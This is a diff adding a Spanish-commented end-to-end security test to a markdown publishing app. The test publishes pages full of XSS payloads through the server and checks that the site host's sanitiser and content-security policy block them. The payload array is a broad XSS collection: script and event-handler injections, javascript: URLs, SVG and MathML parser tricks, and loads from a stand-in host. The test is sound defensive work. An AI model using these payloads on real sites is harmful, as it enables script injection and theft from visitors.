@@ -166,6 +166,100 @@ await app.click('.lmd-gal-theme [data-gal=back]'); await app.waitForTimeout(800)
 o.volverTema = await scan(); o.estilo = await app.evaluate(() => (document.documentElement.getAttribute('style') || '') + ' ' + document.querySelector('style[data-lmd-custom], .lmd-custom-css, #lmd-custom')?.textContent);
 await app.click('[data-act=close-panel]'); await app.waitForTimeout(200);
 
+// ---------- Un sitio publicado con HTML hostil ----------
+// Lo que llega al servidor para publicar lo arma un navegador, pero la ruta la puede llamar cualquiera con su sesión:
+// acá se le manda HTML hostil a mano, sin pasar por la app, y se abre cada página en el host de sitios. Ninguna
+// carga puede correr, y en la página no queda nada fuera de la lista blanca. Además se comprueba que la política de
+// contenido del host frena un script, un manejador o un estilo en línea aunque alguno llegara a la página.
+const sitio = { pwn: [], malas: [], dialogs: [], pedidos: [], errores: [], paginas: 0 };
+{
+  const { spawn } = await import('child_process'); const http = await import('http');
+  const port = 21000 + Math.floor(Math.random() * 3000); const base = 'http://127.0.0.1:' + port; const PAGES = 'http://pages.localhost:' + port;
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mdxss-'));
+  const proc = spawn(process.execPath, [path.join(root, 'server', 'server.mjs')], { env: { ...process.env, PORT: String(port), DATA_DIR: dir, DEV_CODES: '1', ADMIN_KEY: 'clave-de-prueba', PUBLIC_URL: base, PAGES_URL: PAGES }, stdio: ['ignore', 'pipe', 'pipe'] });
+  let log = ''; proc.stdout.on('data', (d) => { log += d; }); proc.stderr.on('data', (d) => { log += d; });
+  for (let i = 0; i < 80 && !/puerto/.test(log); i++) await new Promise((r) => setTimeout(r, 100));
+  const call = (m, p, b, s, extra) => fetch(base + p, { method: m, headers: Object.assign({ 'content-type': 'application/json' }, s ? { authorization: 'Bearer ' + s } : {}, extra || {}), body: b === undefined ? undefined : JSON.stringify(b) }).then(async (r) => ({ status: r.status, json: await r.json().catch(() => null) }));
+  try {
+    const mail = 'hostil@ejemplo.test'; const code = (await call('POST', '/auth/start', { email: mail })).json.dev_code; const s = (await call('POST', '/auth/verify', { email: mail, code })).json.session;
+    await call('POST', '/admin/plan', { email: mail, plan: 'pro' }, undefined, { 'x-admin-key': 'clave-de-prueba' });
+    const svgData = (xml) => 'data:image/svg+xml;base64,' + Buffer.from(xml).toString('base64');
+    const CARGAS = [
+      '<script>' + P + '</script><script src="data:text/javascript,' + P + '"></script><script src="https://xss.invalid/x.js"></script>',
+      '<img src=x onerror="' + P + '"><img src="https://xss.invalid/a.png" onload="' + P + '" onerror="' + P + '"><image src=x onerror="' + P + '">',
+      '<svg onload="' + P + '"><script>' + P + '</script><a xlink:href="javascript:' + P + '"><text y="20">svg</text></a><foreignObject><body onload="' + P + '"><iframe src="javascript:' + P + '"></iframe></body></foreignObject><animate onbegin="' + P + '" attributeName="x" dur="1s"/><set attributeName="onmouseover" to="' + P + '"/></svg>',
+      '<svg><style>@import "https://xss.invalid/s.css"; *{background:url(https://xss.invalid/bg)}</style><use href="https://xss.invalid/u.svg#x"/><image href="https://xss.invalid/i.png"/></svg>',
+      '<math><mtext><table><mglyph><style><img src=x onerror="' + P + '"></style></mglyph></table></mtext></math><math><annotation-xml encoding="text/html"><img src=x onerror="' + P + '"></annotation-xml></math>',
+      '<math><mi href="javascript:' + P + '" xlink:href="javascript:' + P + '">clic</mi><maction actiontype="statusline#javascript:' + P + '">x</maction><mtext></form><form><mglyph><style></math><img src onerror="' + P + '">',
+      '<iframe src="javascript:' + P + '"></iframe><iframe srcdoc="<script>parent.__pwn=1</script>"></iframe><object data="javascript:' + P + '"></object><embed src="javascript:' + P + '"><frameset onload="' + P + '"></frameset>',
+      '<form action="javascript:' + P + '"><input autofocus onfocus="' + P + '"><button formaction="javascript:' + P + '">enviar</button><select autofocus onfocus="' + P + '"></select><textarea autofocus onfocus="' + P + '"></textarea></form>',
+      '<a href="javascript:' + P + '" id="j1">uno</a> <a href="JaVaScRiPt:' + P + '">dos</a> <a href="&#106;avascript:' + P + '">tres</a> <a href="java&#x09;script:' + P + '">cuatro</a> <a href=" &#14; javascript:' + P + '">cinco</a> <a href="javascript&colon;' + P + '">seis</a> <a href="data:text/html,<script>parent.__pwn=1</script>">siete</a> <a href="vbscript:msgbox(1)">ocho</a>',
+      '<img src="' + svgData('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><script>' + P + ';parent.__pwn=1;top.__pwn=1</script><rect width="40" height="40" onclick="' + P + '"/></svg>') + '"><img src="' + svgData('<svg xmlns="http://www.w3.org/2000/svg" onload="' + P + '"/>') + '"><img src="data:text/html,<script>' + P + '</script>">',
+      '<img src="' + svgData('<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><foreignObject width="40" height="40"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:parent.__pwn=1"></iframe></foreignObject></svg>') + '" alt="marco adentro">',
+      '<style>@import "https://xss.invalid/a.css"; .sp-top,.sp-foot{display:none} body{background:url(https://xss.invalid/b)}</style><link rel="stylesheet" href="https://xss.invalid/l.css"><p style="position:fixed;inset:0;background:url(https://xss.invalid/c);z-index:99999">tapa todo</p>',
+      '<base href="https://xss.invalid/"><meta http-equiv="refresh" content="0;url=https://xss.invalid/fuera"><meta http-equiv="Content-Security-Policy" content="script-src * \'unsafe-inline\'"><title>otro</title>',
+      '<details open ontoggle="' + P + '"><summary onclick="' + P + '">detalle</summary>x</details><video src=x onerror="' + P + '" autoplay></video><audio src=x onerror="' + P + '"></audio><marquee onstart="' + P + '">m</marquee><body onload="' + P + '" onpageshow="' + P + '">',
+      '<div class="sp-top sp-preview" id="sp-main">disfraz</div><a class="sp-made" href="https://xss.invalid/falso">Published with SharpMD</a><label for="sp-navt">Menu</label><div id="sp-navt">x</div><p class="sp-report" data-s="otro-sitio" data-p="">denuncia falsa<button>ok</button></p>',
+      '<noscript><p title="</noscript><img src=x onerror=' + P + '>"></noscript><template><img src=x onerror="' + P + '"></template><xmp><img src=x onerror="' + P + '"></xmp><textarea></textarea><img src=x onerror="' + P + '">',
+      '<!--><img src=x onerror="' + P + '">--><!-- --!><img src=x onerror="' + P + '"><![CDATA[<img src=x onerror="' + P + '">]]><?pi <img src=x onerror="' + P + '">?>',
+      '<p title="&quot;><img src=x onerror=' + P + '>">título</p><img src="https://xss.invalid/q.png" alt="&quot;><img src=x onerror=' + P + '>"><a href="https://xss.invalid/?a=&quot;><img src=x onerror=' + P + '>">comillas</a><h2 id="&quot;><img src=x onerror=' + P + '>">ancla</h2>',
+      '<a data-wiki="&quot;><img src=x onerror=' + P + '>">wiki</a> <a data-wiki="javascript:' + P + '">wiki 2</a> <a href="../../../../etc/passwd">arriba</a> <a href="pag-2.md#&quot;><img src=x onerror=' + P + '>">sección</a> <a href="//xss.invalid/x" target="_top" onclick="' + P + '">doble barra</a>',
+      '\u0000<scr\u0000ipt>' + P + '</scr\u0000ipt><img src=x one\u0000rror="' + P + '"><a href="java\u0000script:' + P + '">nulo</a><svg><script>' + P + '</script>'.repeat(30) + '<img src=x onerror="' + P + '">',
+    ];
+    for (let i = 0; i < CARGAS.length; i++) await call('PUT', '/notes/' + encodeURIComponent('hostil/pag-' + i + '.md'), { text: '# Página ' + i }, s);
+    const st = (await call('POST', '/sites', { folder: 'hostil', slug: 'hostil', title: '<img src=x onerror=' + P + '>', descr: '"><script>' + P + '</script>', logo: '<svg onload=' + P + '>', author: '<script>' + P + '</script>' }, s)).json;
+    for (let i = 0; i < CARGAS.length; i++) await call('PUT', '/sites/' + st.id + '/pages', { pages: [{ note: 'hostil/pag-' + i + '.md', rev: 1, title: '<img src=x onerror=' + P + '> ' + i, descr: '"><script>' + P + '</script>', html: '<h1>Página ' + i + '</h1>' + CARGAS[i] + '<p>fin</p>' }] }, s);
+    await call('POST', '/sites/' + st.id + '/publish', {}, s);
+    const pg = await ctx.newPage();
+    pg.on('pageerror', (e) => sitio.errores.push(e.message)); pg.on('dialog', (d) => { sitio.dialogs.push(d.message()); d.dismiss().catch(() => {}); });
+    pg.on('request', (r) => { if (/xss\.invalid/.test(r.url()) && r.resourceType() !== 'image') sitio.pedidos.push(r.resourceType() + ' ' + r.url()); });
+    pg.on('framenavigated', (f) => { if (f === pg.mainFrame() && !f.url().startsWith(PAGES) && f.url() !== 'about:blank') sitio.pedidos.push('navegó a ' + f.url()); });
+    const OK = 'a abbr b blockquote br caption cite code col colgroup dd del details dfn div dl dt em figcaption figure h1 h2 h3 h4 h5 h6 hr i img ins kbd li mark nav ol p pre q rp rt ruby s samp section small span strong sub summary sup table tbody td tfoot th thead tr u ul var wbr math semantics mrow mi mo mn ms mtext mspace msup msub msubsup mfrac msqrt mroot munder mover munderover mtable mtr mtd mstyle mpadded mphantom menclose merror';
+    for (let i = 0; i < CARGAS.length; i++) {
+      await pg.goto(PAGES + '/hostil/pag-' + i); await pg.waitForSelector('.sp-body'); await pg.waitForTimeout(250);
+      // Pasar el mouse y dar foco a todo lo del cuerpo, y un clic en cada enlace que no saca de la página.
+      await pg.evaluate(() => { document.querySelectorAll('.sp-body *').forEach((n) => { for (const t of ['mouseover', 'mouseenter', 'focus', 'pointerover', 'toggle', 'load', 'error']) n.dispatchEvent(new Event(t, { bubbles: true })); if (n.tagName === 'A' && !/^https?:/.test(n.getAttribute('href') || '')) n.click(); if (n.tagName === 'SUMMARY') n.click(); }); });
+      await pg.waitForTimeout(150);
+      const r = await pg.evaluate((ok) => {
+        const allow = new Set(ok.split(' ')); const bad = []; const body = document.querySelector('.sp-body');
+        body.querySelectorAll('*').forEach((n) => {
+          if (!allow.has(n.localName)) bad.push('etiqueta ' + n.localName);
+          for (const a of n.attributes) {
+            if (/^on/i.test(a.name) || ['style', 'srcset', 'target', 'ping', 'name', 'action', 'formaction', 'srcdoc', 'xlink:href', 'background'].includes(a.name.toLowerCase()) || /^data-/i.test(a.name)) bad.push('atributo ' + a.name + ' en ' + n.localName);
+            if ((a.name === 'href' || a.name === 'src') && !/^(https:\/\/|#|\/hostil\/|data:image\/)/i.test(a.value.trim())) bad.push(a.name + ' ' + a.value.slice(0, 60));
+            if (a.name === 'id' && /^sp-/.test(a.value)) bad.push('id ' + a.value); if (a.name === 'class' && /(^|\s)sp-(?!al-|check|on|noimg)/.test(a.value)) bad.push('clase ' + a.value);
+          }
+        });
+        return { pwn: window.__pwn, bad, scripts: document.scripts.length, src: [...document.scripts].map((x) => x.getAttribute('src').split('?')[0]).join(), styles: document.querySelectorAll('style, [style]').length, sheets: document.styleSheets.length, base: document.querySelectorAll('base, meta[http-equiv]').length,
+          title: document.title, made: [...document.querySelectorAll('.sp-made')].map((a) => a.href).join(), top: getComputedStyle(document.querySelector('.sp-top')).display, mains: document.querySelectorAll('#sp-main').length, reports: document.querySelectorAll('.sp-report').length };
+      }, OK);
+      sitio.paginas++;
+      if (r.pwn !== undefined) sitio.pwn.push(i);
+      if (r.bad.length || r.scripts !== 1 || r.src !== '/_/site.js' || r.styles !== 0 || r.sheets !== 1 || r.base !== 0 || r.made !== 'https://sharpmd.app/' || r.top === 'none' || r.mains !== 1 || r.reports !== 0 || !/onerror/.test(r.title)) sitio.malas.push([i, r]);
+    }
+    // La política de contenido, sola: aunque algo llegara a la página, no corre ni se aplica.
+    await pg.goto(PAGES + '/hostil/pag-0'); await pg.waitForSelector('.sp-body');
+    sitio.csp = await pg.evaluate(async () => {
+      const b = document.querySelector('.sp-body'); const out = {};
+      const sc = document.createElement('script'); sc.textContent = 'window.__csp1 = 1'; b.appendChild(sc);
+      const ext = document.createElement('script'); ext.src = 'data:text/javascript,window.__csp2=1'; b.appendChild(ext);
+      const im = document.createElement('div'); im.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__csp3=1" onerror="window.__csp3=1">'; b.appendChild(im);
+      const a = document.createElement('a'); a.href = 'javascript:window.__csp4=1'; a.textContent = 'x'; b.appendChild(a); a.click();
+      const st = document.createElement('style'); st.textContent = '.sp-top{display:none !important}'; document.head.appendChild(st);
+      const p = document.createElement('p'); p.setAttribute('style', 'position:fixed'); b.appendChild(p);
+      const fr = document.createElement('iframe'); fr.src = 'https://xss.invalid/marco'; b.appendChild(fr);
+      let fetched = 'no'; try { await fetch('https://xss.invalid/datos'); fetched = 'salió'; } catch (e) { fetched = 'cortado'; }
+
+      await new Promise((r) => setTimeout(r, 500));
+      return { c1: window.__csp1, c2: window.__csp2, c3: window.__csp3, c4: window.__csp4, top: getComputedStyle(document.querySelector('.sp-top')).display, pos: getComputedStyle(p).position, fetched };
+    });
+    sitio.cabeceras = await (async () => { const r = await new Promise((resolve) => { const q = http.request({ host: '127.0.0.1', port, path: '/hostil/pag-0', headers: { host: 'pages.localhost:' + port } }, (res) => { res.resume(); res.on('end', () => resolve(res.headers)); }); q.end(); }); return r; })();
+    sitio.log = /error 500|sitios: error|error no capturado/.test(log);
+    await pg.close();
+  } catch (e) { sitio.errores.push(String(e && e.stack || e)); }
+  proc.kill(); await new Promise((r) => setTimeout(r, 300)); try { fs.rmSync(dir, { recursive: true, force: true }); } catch (e) { /* Windows lo suelta después */ }
+}
+
 const limpio = (s) => s && s.pwn === undefined && s.bad.length === 0;
 const checks = [
   ['leyendo, ninguna carga ejecuta código ni deja manejadores', limpio(o.leer), o.leer],
@@ -182,6 +276,11 @@ const checks = [
   ['la galería descarta lo que llega con CSS, url(), claves de más o un tipo que no existe', o.tarjetas.join() === '7,13', o.tarjetas],
   ['y muestra como texto los nombres, autores, estados y motivos', limpio(o.galeria) && limpio(o.vistaTema) && limpio(o.vistaPlantilla) && o.vistaMal.length === 0, [o.galeria, o.vistaTema, o.vistaPlantilla, o.vistaMal]],
   ['volver de un tema guardado con valores hostiles no mete nada en los estilos', limpio(o.volverTema) && !/xss\.invalid|display/.test(o.estilo), [o.volverTema, o.estilo]],
+  ['sitio publicado: ninguna de las cargas mandadas a mano al servidor ejecuta código en el host de sitios', sitio.paginas >= 20 && sitio.pwn.length === 0 && sitio.dialogs.length === 0 && sitio.errores.length === 0, [sitio.paginas, sitio.pwn, sitio.dialogs, sitio.errores.slice(0, 2)]],
+  ['sitio publicado: en cada página queda solo lo de la lista blanca, con el único script y la única hoja del host, y la plantilla intacta', sitio.malas.length === 0, sitio.malas.slice(0, 2)],
+  ['sitio publicado: no sale ningún pedido que no sea una imagen, y ninguna página navega fuera del host', sitio.pedidos.length === 0, sitio.pedidos.slice(0, 4)],
+  ['sitio publicado: la política de contenido frena por su cuenta un script en línea o de otro lado, un manejador, un javascript:, un estilo en línea, un marco y un pedido a otro servidor', !!sitio.csp && sitio.csp.c1 === undefined && sitio.csp.c2 === undefined && sitio.csp.c3 === undefined && sitio.csp.c4 === undefined && sitio.csp.top !== 'none' && sitio.csp.pos !== 'fixed' && sitio.csp.fetched === 'cortado', sitio.csp],
+  ['sitio publicado: las cabeceras no dejan enmarcar la página ni adivinar el tipo', !!sitio.cabeceras && /frame-ancestors 'none'/.test(sitio.cabeceras['content-security-policy']) && /default-src 'none'/.test(sitio.cabeceras['content-security-policy']) && !/unsafe-inline|unsafe-eval|\*/.test(sitio.cabeceras['content-security-policy']) && sitio.cabeceras['x-frame-options'] === 'DENY' && sitio.cabeceras['x-content-type-options'] === 'nosniff' && sitio.log === false, sitio.cabeceras],
   ['ninguna carga abre un diálogo del navegador', dialogs.length === 0, dialogs],
   ['no sale ningún pedido a otro servidor que no sea una imagen', odd.length === 0, odd],
   ['no navega fuera de la app', new URL(o.url1).protocol === 'chrome-extension:' && new URL(app.url()).protocol === 'chrome-extension:', [o.url1, app.url()]],
